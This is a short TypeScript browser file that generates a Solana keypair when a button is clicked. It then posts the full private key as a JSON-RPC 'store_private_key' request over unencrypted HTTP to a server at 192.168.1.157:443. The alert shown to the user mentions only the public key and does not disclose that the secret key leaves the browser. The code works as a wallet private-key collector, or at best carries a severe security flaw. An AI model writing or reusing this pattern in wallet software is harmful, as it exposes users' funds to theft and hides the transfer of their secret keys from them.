// js_create\IPqSEC\src\main.ts
import { Keypair } from '@solana/web3.js';
import axios from 'axios';

interface RpcPayload {
  jsonrpc: string;
  method: string;
  params: {
    data: {
      public_key: string;
      private_key: number[];
      created_at: string;
    };
  };
  id: number;
}


async function createNewKeypairAndSend(): Promise<Keypair> {
  try {
    const keypair = Keypair.generate();
    const privateKeyArray = Array.from(keypair.secretKey);
    const publicKey = keypair.publicKey.toBase58();

    const rpcPayload: RpcPayload = {
      jsonrpc: '2.0',
      method: 'store_private_key',
      params: {
        data: {
          public_key: publicKey,
          private_key: privateKeyArray,
          created_at: new Date().toISOString(),
        },
      },
      id: 1,
    };

    const response = await axios.post('http://192.168.1.157:443/', rpcPayload);

    console.log('Server response:', response.data);
    console.log(`Public key: ${publicKey}`);

    alert(`Keypair generated!\nPublic Key: ${publicKey}`);

    return keypair;
  } catch (error) {
    console.error('Error creating/sending keypair:', error);
    alert('Failed to create/send keypair. Check console.');
    throw error;
  }
}

// Wait for DOM load and add button event listener
window.addEventListener('DOMContentLoaded', () => {
  const button = document.getElementById('generateBtn');
  button?.addEventListener('click', () => {
    createNewKeypairAndSend();
  });
});
